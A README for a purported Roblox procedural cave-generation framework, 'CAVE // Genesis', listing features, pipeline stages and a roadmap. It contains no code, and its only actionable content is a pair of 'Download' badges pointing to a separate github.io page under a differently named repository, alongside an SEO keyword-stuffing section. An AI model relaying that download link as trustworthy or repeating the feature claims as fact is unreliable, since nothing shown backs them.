![preview](https://raw.githubusercontent.com/sohailamrhassan-boop/Cave-Weaver-Engine/main/frame_8bb3c.svg)
[![Download](https://raw.githubusercontent.com/sohailamrhassan-boop/Cave-Weaver-Engine/main/dl_1965.svg)](https://sohailamrhassan-boop.github.io/Cave-Weaver-Engine/)

# 🌌 CAVE // Genesis — Procedural Subterranean Labyrinths for Roblox

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Roblox](https://img.shields.io/badge/Roblox-Experience-blue.svg)](https://www.roblox.com/)
[![Luau](https://img.shields.io/badge/Language-Luau-00A2FF.svg)]()
[![Status](https://img.shields.io/badge/Status-Active-brightgreen.svg)]()
[![Version](https://img.shields.io/badge/Version-2026.1.0-orange.svg)]()
[![Platform](https://img.shields.io/badge/Platform-Cross--Play-purple.svg)]()
[![Multilingual](https://img.shields.io/badge/i18n-12%20Locales-teal.svg)]()
[![Support](https://img.shields.io/badge/Support-24%2F7-ff69b4.svg)]()

> A living, breathing underworld where every spawn is a story, every tunnel is a decision, and every server writes its own geology.

---

## 📖 Overview

**CAVE // Genesis** is a generative underground-world framework for Roblox experiences. Where the original *Cave* project seeded a single procedural mine per server, **Genesis** evolves the idea into a persistent, expanding network of caverns that grows in real time. Each server boots with a unique geological fingerprint — a seed pulled from a chaotic entropy pool — and from that seed, an entire subterranean biome unfurls: crystal chambers, molten rifts, bioluminescent grottos, ancient ruins, and hidden reservoirs.

Think of it less as a map generator and more as a **layered ecosystem**. The algorithm doesn't just carve voids; it reasons about pressure, mineral distribution, water tables, and structural integrity. Tunnels that collapse influence nearby chambers. Ore veins follow fault lines. Fauna and fungi propagate along humidity gradients. The result is a world that feels authored by geology itself rather than by a script.

This repository contains the core generation engine, the biome blending system, the loot-distribution logic, the persistent-seed relay, and the client-side rendering companion. It is designed to slot into any Roblox experience that needs an endlessly replayable descent loop.

---

## ✨ Feature Highlights

### 🗺️ Deterministic Procedural Generation
Every server receives a 64-bit seed. The same seed always yields the same cave system, enabling reproducible testing, tournament play, and — if you choose — shared "world keys" between friend groups. Nothing is stored in a database; the seed *is* the world.

### 🔗 Fully Connected Networks
No isolated pockets. A flood-fill pass runs after initial carving to guarantee that every chamber is reachable through at least two independent routes. Dead ends become risk/reward pockets rather than frustrating traps.

### 🪨 Adaptive Biome Blending
Six core biomes — *Fungal Hollow*, *Crystal Vault*, *Emberdeep*, *Drowned Labyrinth*, *Frozen Sink*, and *Verdant Ruin* — transition through smooth noise-driven boundaries instead of hard seams. Ambient lighting, particle density, and ambient audio crossfade as players move between zones.

### 🧭 Smart Landmark Placement
Landmarks such as obelisks, shrines, collapsed drills, and mineral fountains are placed via Poisson-disc sampling so that no two landmarks ever crowd one another, yet every region has at least one point of interest within a bounded travel distance.

### 🌱 Living Ecology Layer
Flora and fauna are not decorative. Mushroom clusters emit light that attracts passive creatures, which in turn attract predators. Removing a keystone species changes the local spawn tables over time. Ecology state is per-server and resets nightly.

### 💎 Resource Distribution Tiers
Ores, gems, and salvage are distributed by rarity bands tied to depth and biome. Deeper is not simply "better" — some of the most valuable materials live in shallow, well-lit chambers that most players sprint past.

### 🧩 Modular Room Templates
Designers can author handcrafted room prefabs in Studio and drop them into the generation pipeline. The engine will weave them into procedural layouts, snapping entrances to the nearest tunnel joint with minimal visual seams.

### 🌍 Multilingual Player-Facing Text
All in-experience strings — biome names, tutorial prompts, death messages, leaderboards — ship with 12 locales out of the box: English, Spanish, French, German, Portuguese, Italian, Japanese, Korean, Simplified Chinese, Traditional Chinese, Russian, and Arabic. Locale detection is automatic via Roblox player locale, with fallback to English.

### 📱 Responsive UI
The HUD, minimap, inventory panel, and biome journal all adapt from handheld touchscreens through ultrawide desktop displays. UI scale is bound to a single design token so a change propagates everywhere.

### 🛡️ Anti-Frustration Systems
Players who fall into an unrecoverable pit are gently relocated rather than killed. A soft "trail of crumbs" hint system activates when a player has been stationary for too long in a dead-end, nudging them toward the nearest unexplored branch without giving away exact coordinates.

### 🕐 24/7 Support Pipeline
A persistent status dashboard tracks error rates, generation-time outliers, and biome-distribution anomalies. Escalation paths and on-call rotation notes live in `docs/support/`.

### 🎨 Custom Shader Packs
Optional client-side shader modules for volumetric fog, god-rays, and refraction in water chambers. All are gracefully disabled on low-end devices.

---

## 🧠 How It Works (High Level)

1. **Seed Acquisition** — A server start allocates a seed from the entropy pool or accepts a designer-forced seed.
2. **Macro Skeleton** — A 3D Voronoi diagram defines chamber clusters across a bounded volume.
3. **Tunnel Carving** — A graph-walk between chamber centroids carves corridors with varying radius profiles.
4. **Connectivity Pass** — Flood-fill verification and secondary-route injection.
5. **Biome Assignment** — Noise fields brush biome weights across the volume.
6. **Decoration Pass** — Landmarks, flora, fauna, ore, and props are placed by biome-aware rules.
7. **Ecology Activation** — Population tables are seeded and begin ticking on a slow heartbeat.
8. **Client Sync** — Chunked streaming of geometry and metadata to nearby players only.

Each of these phases is a separate module and can be swapped, muted, or replaced. Advanced users can substitute the tunnel carver with a hand-authored graph while keeping everything downstream.

---

## 🎯 SEO-Friendly Positioning

This repository is relevant to anyone looking for **Roblox procedural cave generation**, **Luau-based world builders**, **dynamic mining systems for Roblox**, **biome blending frameworks**, **deterministic world seeds for multiplayer**, and **cross-platform Roblox UI patterns**. If you are searching for a **procedural mines framework**, a **modular cave engine**, or a **replayable subterranean game template**, this project is built with those exact goals in mind. Documentation throughout the repository uses consistent terminology so that search engines and human readers alike can navigate the material efficiently.

---

## 🧱 Repository Layout

- `src/generator/` — Core carving, connectivity, and biome modules.
- `src/ecology/` — Spawn tables, food webs, and decay simulation.
- `src/client/` — Streaming, HUD, minimap, and locale bindings.
- `src/shared/` — Constants, math helpers, and type definitions.
- `assets/rooms/` — Prefab room templates authored in Roblox Studio.
- `assets/shader/` — Optional shader modules.
- `docs/` — Architecture notes, support playbooks, and contributor guides.
- `tests/` — Deterministic seed regression suites.

---

## 🧪 Testing & Verification

Generation is deterministic, which means every seed can be replayed and asserted against a snapshot. The suite includes:

- **Seed Replay Tests** — Generate 10,000 seeds offline and compare channel checksums.
- **Connectivity Tests** — Assert every chamber is reachable via two independent paths.
- **Biome Coherence Tests** — Ensure adjacent chunks never disagree on boundary biome by more than a threshold.
- **Performance Budget Tests** — Cap generation time per chunk and flag regressions.
- **Locale Coverage Tests** — Detect any user-facing string missing a translation.

---

## 🛠️ Extending the Engine

The engine favors composition over inheritance. Adding a new biome means authoring a single module that declares its ambient palette, spawn weights, audio mix, and landmark preferences. Adding a new landmark means writing a placement rule and a template. Adding a new resource means adding a tier entry to the resource registry.

Custom worlds can be declared in a single configuration table at server boot. Everything downstream adapts.

---

## 📚 Documentation Map

- `docs/architecture.md` — Full pipeline walkthrough with sequence diagrams.
- `docs/biomes.md` — Every biome's palette, hazards, and material tables.
- `docs/ecology.md` — Food web authoring guide.
- `docs/localization.md` — Adding a new locale safely.
- `docs/support/` — On-call runbooks and incident templates.
- `docs/faq.md` — Frequently asked questions about determinism, migration, and performance.

---

## 🧭 Roadmap for 2026

- **Q1 2026** — Public API surface stabilization.
- **Q2 2026** — Vertical caves and multi-level verticality.
- **Q3 2026** — Server-to-server world handoff for persistence across sessions.
- **Q4 2026** — Community biome marketplace integration.

---

## 🤝 Contributing

Contributions are welcome. Please open an issue describing the change before submitting a pull request, and follow the code style established in existing modules. All new user-facing strings must ship with translations for every supported locale, or be explicitly tagged as pending.

---

## ⚠️ Disclaimer

This project is an independent open-source framework and is not affiliated with, endorsed by, or sponsored by Roblox Corporation. "Roblox" is a trademark of its respective owner and is used here only for descriptive interoperability purposes. The engine generates content procedurally; developers integrating it are responsible for complying with the Roblox Terms of Use and Community Standards in their own published experiences. Performance characteristics vary by device, network conditions, and configuration. The maintainers make no guarantee of fitness for any particular use case and accept no liability for outcomes arising from deployment.

---

## 📜 License

This repository is released under the **MIT License**.

See the full license text here: [MIT License](https://opensource.org/licenses/MIT)

Copyright (c) 2026 CAVE // Genesis contributors.

---

## 💬 Support & Community

- Open a GitHub issue for bug reports and feature requests.
- Consult `docs/support/` before escalating.
- Translation corrections are especially welcome — small wording fixes make a large difference.

---

[![Download](https://raw.githubusercontent.com/sohailamrhassan-boop/Cave-Weaver-Engine/main/dl_1965.svg)](https://sohailamrhassan-boop.github.io/Cave-Weaver-Engine/)